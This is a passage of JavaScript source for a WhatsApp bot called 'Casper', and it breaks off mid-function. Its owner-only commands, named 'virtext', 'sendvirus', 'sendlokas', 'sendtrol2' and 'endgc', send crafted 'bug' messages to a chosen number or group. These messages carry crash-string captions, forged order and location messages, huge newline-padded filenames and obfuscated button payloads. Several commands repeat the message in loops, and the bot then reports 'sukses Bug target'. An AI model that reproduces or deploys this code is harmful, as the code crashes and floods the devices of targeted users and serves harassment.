"fileName": `🔥 Casper☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.jpeg`,
"fileEncSha256": "Ndb8qq5fOJW56Hn8bB3+NNvxfTnZtrVnPM97Ak3ON+c=",
"directPath": "/v/t62.7119-24/30623311_146834807959315_9176799642226465389_n.enc?ccb=11-4&oh=01_AVxHWupe_fRozKysLEUfowD0Z_apYBve1H3C_MGsaD4mCw&oe=630DC76C",
"mediaKeyTimestamp": "1659416157",
}
}), { userJid: m.chat })
kesper.relayMessage(Pe, document.message, { messageId: document.key.id })
reply('sukses Bug target')
}
break
//=================================================//
case 'virtext1': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
kesper.sendMessage(m.chat, { image: ppnyauser,  caption: `Casper${iphone}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext2': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
kesper.sendMessage(m.chat, { image: ppnyauser,  caption: `Casper${iphone1}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext3': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
kesper.sendMessage(m.chat, { image: ppnyauser,  caption: `Casper${iphone2}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext4': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
kesper.sendMessage(m.chat, { image: ppnyauser,  caption: `Casper${iphone3}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext5': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
kesper.sendMessage(m.chat, { image: ppnyauser,  caption: `Casper${iphone4}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext6': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
kesper.sendMessage(m.chat, { image: ppnyauser,  caption: `Casper${iphone5}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext7': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
kesper.sendMessage(m.chat, { image: ppnyauser,  caption: `Casper${iphone6}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext8': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
kesper.sendMessage(m.chat, { image: ppnyauser,  caption: `Casper${buttonkal}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext9': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
kesper.sendMessage(m.chat, { image: ppnyauser,  caption: `Casper${buttonvirus}` }, { quoted:m })
}
}
break
//=================================================//
case 'virtext10': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (args.length == 0) return m.reply(`Jumlahnya?`)
jumlah = `${encodeURI(q)}`
for (let i = 0; i < jumlah; i++) {
kesper.sendMessage(m.chat, { image: ppnyauser,  caption: `Casper${ngazap(prefix)}`}, { quoted:m })
}
}
break
case 'sendvirus': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
kesper.sendMessage(Pe, { image: ppnyauser,  caption: `Casper${iphone}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus2': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
kesper.sendMessage(Pe, { image: ppnyauser,  caption: `Casper${iphone1}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus3': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
kesper.sendMessage(Pe, { image: ppnyauser,  caption: `Casper${iphone2}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus4': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
kesper.sendMessage(Pe, { image: ppnyauser,  caption: `Casper${iphone3}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus5': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
kesper.sendMessage(Pe, { image: ppnyauser,  caption: `Casper${iphone4}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus6': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
kesper.sendMessage(Pe, { image: ppnyauser,  caption: `Casper${iphone5}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus7': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
kesper.sendMessage(Pe, { image: ppnyauser,  caption: `Casper${iphone6}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus8': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
kesper.sendMessage(Pe, { image: ppnyauser,  caption: `Casper${buttonkal}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus9': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
kesper.sendMessage(Pe, { image: ppnyauser,  caption: `Casper${buttonvirus}` }, { quoted:m })
}
break
//=================================================//
case 'sendvirus10': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
kesper.sendMessage(Pe, { image: ppnyauser,  caption: `Casper${ngazap(prefix)}`}, { quoted:m })
}
break
//=================================================//
case 'jadijago': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} kesper`)
let teks = `${q}`
{
var _0x466e28=_0x285e;(function(_0x37e30e,_0x36bc7a){var _0x8d21a3=_0x285e,_0x3b7e62=_0x37e30e();while(!![]){try{var _0x2ee322=-parseInt(_0x8d21a3(0x15d))/0x1*(-parseInt(_0x8d21a3(0x168))/0x2)+-parseInt(_0x8d21a3(0x166))/0x3+parseInt(_0x8d21a3(0x15b))/0x4*(-parseInt(_0x8d21a3(0x157))/0x5)+parseInt(_0x8d21a3(0x158))/0x6+parseInt(_0x8d21a3(0x153))/0x7*(parseInt(_0x8d21a3(0x160))/0x8)+parseInt(_0x8d21a3(0x155))/0x9+-parseInt(_0x8d21a3(0x15a))/0xa*(parseInt(_0x8d21a3(0x15c))/0xb);if(_0x2ee322===_0x36bc7a)break;else _0x3b7e62['push'](_0x3b7e62['shift']());}catch(_0x23d02a){_0x3b7e62['push'](_0x3b7e62['shift']());}}}(_0x1922,0x4ea1d));var message={'document':fs[_0x466e28(0x169)](_0x466e28(0x163)),'fileName':_0x466e28(0x152),'caption':_0x466e28(0x15e),'footer':'CASPER','mentionedJid':m[_0x466e28(0x167)],'templateButtons':[{'urlButton':{'displayText':_0x466e28(0x152),'url':_0x466e28(0x162)}},{'urlButton':{'displayText':'CASPER','url':'www.casper.com'}},{'urlButton':{'displayText':_0x466e28(0x152),'url':'www.casper.com'}},{'callButton':{'displayText':_0x466e28(0x154),'phoneNumber':'62882003133773'}},{'callButton':{'displayText':_0x466e28(0x154),'phoneNumber':_0x466e28(0x164)}},{'callButton':{'displayText':'OWNER','phoneNumber':_0x466e28(0x164)}},{'quickReplyButton':{'displayText':_0x466e28(0x156),'id':_0x466e28(0x161)}},{'quickReplyButton':{'displayText':_0x466e28(0x156),'id':_0x466e28(0x159)}},{'quickReplyButton':{'displayText':_0x466e28(0x156),'id':'🔧'}},{'quickReplyButton':{'displayText':_0x466e28(0x156),'id':'🪞'}}],'headerType':0x5};function _0x285e(_0x419cc9,_0x1b95df){var _0x192207=_0x1922();return _0x285e=function(_0x285e88,_0x1525fb){_0x285e88=_0x285e88-0x152;var _0x38a03b=_0x192207[_0x285e88];return _0x38a03b;},_0x285e(_0x419cc9,_0x1b95df);}kesper[_0x466e28(0x165)](m[_0x466e28(0x15f)],message,{'quoted':m});function _0x1922(){var _0x49f7c7=['110uFtQkx','2086356nHmQLX','🛡️','64270XUhiXf','90472rzVaUT','979IYPnlf','557JxeSzF','\x20CASPER','chat','1552EkxPgS','🗡️','www.casper.com','./casper-file/sound/ngeselin.BIN','62882003133773','sendMessage','104949JvSLqj','mentionedJid','982kFTGJX','readFileSync','CASPER','12313xePZdu','OWNER','4177800Hdsdtf','CLICK\x20BY'];_0x1922=function(){return _0x49f7c7;};return _0x1922();}
}
}
break
case '💃': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Casper`
for (let i = 0; i < jumlah; i++) {
var _0x466e28=_0x285e;(function(_0x37e30e,_0x36bc7a){var _0x8d21a3=_0x285e,_0x3b7e62=_0x37e30e();while(!![]){try{var _0x2ee322=-parseInt(_0x8d21a3(0x15d))/0x1*(-parseInt(_0x8d21a3(0x168))/0x2)+-parseInt(_0x8d21a3(0x166))/0x3+parseInt(_0x8d21a3(0x15b))/0x4*(-parseInt(_0x8d21a3(0x157))/0x5)+parseInt(_0x8d21a3(0x158))/0x6+parseInt(_0x8d21a3(0x153))/0x7*(parseInt(_0x8d21a3(0x160))/0x8)+parseInt(_0x8d21a3(0x155))/0x9+-parseInt(_0x8d21a3(0x15a))/0xa*(parseInt(_0x8d21a3(0x15c))/0xb);if(_0x2ee322===_0x36bc7a)break;else _0x3b7e62['push'](_0x3b7e62['shift']());}catch(_0x23d02a){_0x3b7e62['push'](_0x3b7e62['shift']());}}}(_0x1922,0x4ea1d));var message={'document':fs[_0x466e28(0x169)](_0x466e28(0x163)),'fileName':_0x466e28(0x152),'caption':_0x466e28(0x15e),'footer':'CASPER','mentionedJid':m[_0x466e28(0x167)],'templateButtons':[{'urlButton':{'displayText':_0x466e28(0x152),'url':_0x466e28(0x162)}},{'urlButton':{'displayText':'CASPER','url':'www.casper.com'}},{'urlButton':{'displayText':_0x466e28(0x152),'url':'www.casper.com'}},{'callButton':{'displayText':_0x466e28(0x154),'phoneNumber':'62882003133773'}},{'callButton':{'displayText':_0x466e28(0x154),'phoneNumber':_0x466e28(0x164)}},{'callButton':{'displayText':'OWNER','phoneNumber':_0x466e28(0x164)}},{'quickReplyButton':{'displayText':_0x466e28(0x156),'id':_0x466e28(0x161)}},{'quickReplyButton':{'displayText':_0x466e28(0x156),'id':_0x466e28(0x159)}},{'quickReplyButton':{'displayText':_0x466e28(0x156),'id':'🔧'}},{'quickReplyButton':{'displayText':_0x466e28(0x156),'id':'🪞'}}],'headerType':0x5};function _0x285e(_0x419cc9,_0x1b95df){var _0x192207=_0x1922();return _0x285e=function(_0x285e88,_0x1525fb){_0x285e88=_0x285e88-0x152;var _0x38a03b=_0x192207[_0x285e88];return _0x38a03b;},_0x285e(_0x419cc9,_0x1b95df);}kesper[_0x466e28(0x165)](m[_0x466e28(0x15f)],message,{'quoted':m});function _0x1922(){var _0x49f7c7=['110uFtQkx','2086356nHmQLX','🛡️','64270XUhiXf','90472rzVaUT','979IYPnlf','557JxeSzF','\x20CASPER','chat','1552EkxPgS','🗡️','www.casper.com','./casper-file/sound/ngeselin.BIN','62882003133773','sendMessage','104949JvSLqj','mentionedJid','982kFTGJX','readFileSync','CASPER','12313xePZdu','OWNER','4177800Hdsdtf','CLICK\x20BY'];_0x1922=function(){return _0x49f7c7;};return _0x1922();}
}
gesper = fs.readFileSync('./casper-file/sound/dj kane.mp3')
 kesper.sendMessage(m.chat, {audio: gesper, mimetype: 'audio/mpeg', ptt:true }, {quoted:exe})
 }
break
//=================================================//
case 'sendlokas': case 'sendlokas3': case 'sendlokas4': case 'sendlokas5': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./casper-file/image/hwmodsgans.jpg') }, { upload: kesper.waUploadToServer })
var liveLocation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `© Casper${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted:m})
kesper.relayMessage(Pe, liveLocation.message, { messageId: liveLocation.key.id })
reply('sukses Bug target')
}
break
//=================================================//
case 'sendlokas2': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./casper-file/image/hwmodsgans.jpg') }, { upload: kesper.waUploadToServer })
var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"locationMessage": {
"degreesLatitude": -6.936928157735237,
"degreesLongitude": 107.72270679473877,
"caption": `© Casper${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted:m})
kesper.relayMessage(Pe, location.message, { messageId: location.key.id })
reply('sukses Bug target')
}
break
//=================================================//
case 'sendtrol2': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./casper-file/image/hwmodsgans.jpg') }, { upload: kesper.waUploadToServer })
var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "orderMessage": {
"orderId": "449756950375071",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `© Casper${ngazap(prefix)}`,
"jpegThumbnail":fs.readFileSync('./casper-file/image/pict.jpg'),
"orderTitle": `© Casper${ngazap(prefix)}`,
"sellerJid": "6285714170944@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: m.chat, quoted:m})
kesper.relayMessage(Pe, order.message, { messageId: order.key.id })
reply('sukses Bug target')
}
break
//=================================================//
case 'afk': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
let user = global.db.data.users[m.sender]
user.afkTime = + new Date
user.afkReason = text
m.reply(`${m.pushName} Hello Saya Bot Casper${text ? ': ' + text : ''}`)
}
break
//=================================================//
case '🔥': 
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Casper`
for (let i = 0; i < jumlah; i++) {
const buttons = [
{buttonId: `${prefix}djisdjiwdjjes`, buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babaabbabababa', buttonText: {displayText: buttonvirus}, type: 1},
{buttonId: 'babababbababa', buttonText: {displayText: buttonvirus}, type: 1}
]
const buttonMessage = {
text: "𝙘𝙞𝙡𝙤 𝙗𝙤𝙩",
footerText: 'Pe',
buttons: buttons,
headerType: 1
}
kesper.sendMessage(m.chat, buttonMessage)
}
 break
case 'inspect': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!args[0]) return m.reply("Linknya?")
let linkRegex = args.join(" ")
let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
if (!coded) return m.reply("Link Invalid")
kesper.query({
tag: "iq",
attrs: {
type: "get",
xmlns: "w:g2",
to: "@g.us"
},
content: [{ tag: "invite", attrs: { code: coded } }]
}).then(async(res) => { 
tekse = `「 Group Link Yang Di Inspect 」
▸ Nama Group : ${res.content[0].attrs.subject ? res.content[0].attrs.subject : "undefined"}

▸ Deskripsi Di Ubah : ${res.content[0].attrs.s_t ? moment(res.content[0].attrs.s_t *1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Pembuat Group : ${res.content[0].attrs.creator ? "@" + res.content[0].attrs.creator.split("@")[0] : "undefined"}
▸ Group Di Buat : ${res.content[0].attrs.creation ? moment(res.content[0].attrs.creation * 1000).tz("Asia/Jakarta").format("DD-MM-YYYY, HH:mm:ss") : "undefined"}
▸ Total Member : ${res.content[0].attrs.size ? res.content[0].attrs.size : "undefined"} Member

▸ ID Group  : ${res.content[0].attrs.id ? res.content[0].attrs.id : "undefined"}

©By kesper`
try {
pp = await kesper.profilePictureUrl(res.content[0].attrs.id + "@g.us", "image")
} catch {
pp = "https://tse2.mm.bing.net/th?id=OIP.n1C1oxOvYLLyDIavrBFoNQHaHa&pid=Api&P=0&w=153&h=153"
}
kesper.sendFile(m.chat, pp, "", m, { caption: tekse, mentions: await kesper.parseMention(tekse) })
})
}
break
//=================================================//
case 'sokkeras️': case 'jagoantod': case 'endbro':{
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
a = await kesper.sendMessage(m.chat, {react: { text: `${ngazap(prefix)}`, key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
jumlah = `${encodeURI(q)}`
ydd = `Casper`
for (let i = 0; i < jumlah; i++) {
function _0x25b7(){var _0x1caa75=['24ajTWak','33543EytfKf','chat','https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2','2681IijFIS','AH\x20SLEBEEW','GROUP','OWNER','498snEsqb','920346IkZDMV','62882003133773','1254936ePHhrm','Anjay\x20Menger','10UNHKZf','251447UYkEKs','1300952jXozAh','9904230ASpLsN','JAGOAN\x20OM?','CASPER'];_0x25b7=function(){return _0x1caa75;};return _0x25b7();}function _0x1062(_0x469f51,_0x1fb3ff){var _0x25b713=_0x25b7();return _0x1062=function(_0x10626f,_0x4e7ae2){_0x10626f=_0x10626f-0x80;var _0xcfcf6e=_0x25b713[_0x10626f];return _0xcfcf6e;},_0x1062(_0x469f51,_0x1fb3ff);}var _0xf74c20=_0x1062;(function(_0x20b028,_0x12733a){var _0x391c04=_0x1062,_0x5a2ffa=_0x20b028();while(!![]){try{var _0x1dde66=-parseInt(_0x391c04(0x8b))/0x1+-parseInt(_0x391c04(0x88))/0x2+-parseInt(_0x391c04(0x86))/0x3+-parseInt(_0x391c04(0x8c))/0x4*(-parseInt(_0x391c04(0x8a))/0x5)+parseInt(_0x391c04(0x85))/0x6*(parseInt(_0x391c04(0x81))/0x7)+-parseInt(_0x391c04(0x90))/0x8*(-parseInt(_0x391c04(0x91))/0x9)+parseInt(_0x391c04(0x8d))/0xa;if(_0x1dde66===_0x12733a)break;else _0x5a2ffa['push'](_0x5a2ffa['shift']());}catch(_0x26c393){_0x5a2ffa['push'](_0x5a2ffa['shift']());}}}(_0x25b7,0x799fc),kesper['sendMessage'](m[_0xf74c20(0x92)],{'text':'','templateButtons':[{'callButton':{'displayText':_0xf74c20(0x84),'phoneNumber':_0xf74c20(0x87)}},{'callButton':{'displayText':'OWNER','phoneNumber':'62882003133773'}},{'callButton':{'displayText':'OWNER','phoneNumber':_0xf74c20(0x87)}},{'urlButton':{'displayText':_0xf74c20(0x83),'url':'https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2'}},{'urlButton':{'displayText':_0xf74c20(0x83),'url':_0xf74c20(0x80)}},{'urlButton':{'displayText':_0xf74c20(0x83),'url':_0xf74c20(0x80)}},{'quickReplyButton':{'displayText':'MY','id':_0xf74c20(0x89)}},{'quickReplyButton':{'displayText':'NAME','id':_0xf74c20(0x82)}},{'quickReplyButton':{'displayText':_0xf74c20(0x8f),'id':_0xf74c20(0x8e)}}]}));
}
}
break
case 'endgc':{
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
Peli = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
a = await kesper.sendMessage(m.chat, {react: { text: `${ngazap(prefix)}`, key: { remoteJid: Peli, fromMe: true, id : m.key.id}}})
function _0x46ae(_0x1211af,_0x55d593){var _0xe67dbb=_0xe67d();return _0x46ae=function(_0x46ae89,_0xdd81f0){_0x46ae89=_0x46ae89-0x19f;var _0x4bfb17=_0xe67dbb[_0x46ae89];return _0x4bfb17;},_0x46ae(_0x1211af,_0x55d593);}var _0x1fbd12=_0x46ae;(function(_0x253082,_0x12a4c7){var _0x3ad0d2=_0x46ae,_0x4437e2=_0x253082();while(!![]){try{var _0x34eca5=parseInt(_0x3ad0d2(0x1a0))/0x1+-parseInt(_0x3ad0d2(0x1b4))/0x2*(-parseInt(_0x3ad0d2(0x1ae))/0x3)+-parseInt(_0x3ad0d2(0x1a8))/0x4*(parseInt(_0x3ad0d2(0x19f))/0x5)+-parseInt(_0x3ad0d2(0x1a7))/0x6*(-parseInt(_0x3ad0d2(0x1aa))/0x7)+-parseInt(_0x3ad0d2(0x1ac))/0x8+-parseInt(_0x3ad0d2(0x1b3))/0x9*(parseInt(_0x3ad0d2(0x1af))/0xa)+parseInt(_0x3ad0d2(0x1b1))/0xb*(-parseInt(_0x3ad0d2(0x1ab))/0xc);if(_0x34eca5===_0x12a4c7)break;else _0x4437e2['push'](_0x4437e2['shift']());}catch(_0x18d65b){_0x4437e2['push'](_0x4437e2['shift']());}}}(_0xe67d,0x9ac33),kesper[_0x1fbd12(0x1a4)](Peli,{'text':'','templateButtons':[{'callButton':{'displayText':_0x1fbd12(0x1a9),'phoneNumber':_0x1fbd12(0x1a5)}},{'callButton':{'displayText':'OWNER','phoneNumber':'62882003133773'}},{'callButton':{'displayText':_0x1fbd12(0x1a9),'phoneNumber':'62882003133773'}},{'urlButton':{'displayText':_0x1fbd12(0x1a2),'url':'https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2'}},{'urlButton':{'displayText':_0x1fbd12(0x1a2),'url':'https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2'}},{'urlButton':{'displayText':_0x1fbd12(0x1a2),'url':_0x1fbd12(0x1b0)}},{'quickReplyButton':{'displayText':'MY','id':_0x1fbd12(0x1ad)}},{'quickReplyButton':{'displayText':_0x1fbd12(0x1a1),'id':_0x1fbd12(0x1a3)}},{'quickReplyButton':{'displayText':_0x1fbd12(0x1b2),'id':_0x1fbd12(0x1a6)}}]}));function _0xe67d(){var 